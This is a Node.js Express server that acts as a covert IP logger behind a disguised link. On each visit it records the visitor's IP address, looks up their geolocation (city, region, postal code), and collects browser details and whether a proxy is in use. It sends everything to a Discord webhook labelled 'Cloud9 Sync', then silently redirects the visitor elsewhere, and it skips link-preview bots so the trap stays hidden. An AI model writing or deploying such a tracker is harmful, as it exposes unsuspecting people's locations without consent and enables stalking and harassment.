const unwantedUserAgents = ["Vercelbot/0.1 (+https://vercel.com/)", "got (https://github.com/sindresorhus/got)"];
const fetch = require("isomorphic-fetch");
const express = require("express");
const app = express();

const { sendWebhook } = require("./webhook");
const { MessageBuilder } = require("discord-webhook-node");
const channelID = process.env.channel_id;
const ip_token = process.env.ip_token;
const port = process.env.port || 3000;

app.get("/", async (req, res) => {
  const ipAddress = req.headers["x-forwarded-for"] || req.socket.remoteAddress;
  const userAgent = req.headers["user-agent"];
  const isUnwantedUserAgent = unwantedUserAgents.some(unwantedUserAgent => userAgent.includes(unwantedUserAgent));
  if (isUnwantedUserAgent) { res.status(200).send("Skipping unwanted User Agent"); return; }
  const { region, city, country, postal } = await (await fetch(`https://ipinfo.io/${ipAddress}?token=${ip_token}`)).json();
  const lang = req.headers["accept-language"]?.split(",")[0] || "Unknown";
  const platform = userAgent ? userAgent.split("(")[1].split(")")[0] : "Unknown";
  const browser = userAgent ? userAgent.split("/")[0] : "Unknown";
  const isProxy = req.headers["via"] || req.headers["x-forwarded-for"];
  try {
    const embed = new MessageBuilder()
      .setTitle("Cloud9 Sync")
      .setDescription("New address logged.")
      .addField("IP", ipAddress)
      .addField("Country", country)
      .addField("Region", region)
      .addField("City", city)
      .addField("Postal", postal)
      .addField("User Agent", userAgent)
      .addField("Browser Language", lang)
      .addField("Platform", platform)
      .addField("Browser", browser)
      .addField("Proxy/VPN", isProxy ? "Yes" : "No")
      .setColor("#5CDBF0")
      .setTimestamp();
    await sendWebhook(channelID, embed);

    res.redirect(process.env.redirect_url);
  } catch (error) {
    console.error(`Error handling request:\n${error.stack}`);
    res.status(500).send("Internal server error");
  }
});

app.listen(port, () => console.log(`App listening at http://localhost:${port}`));
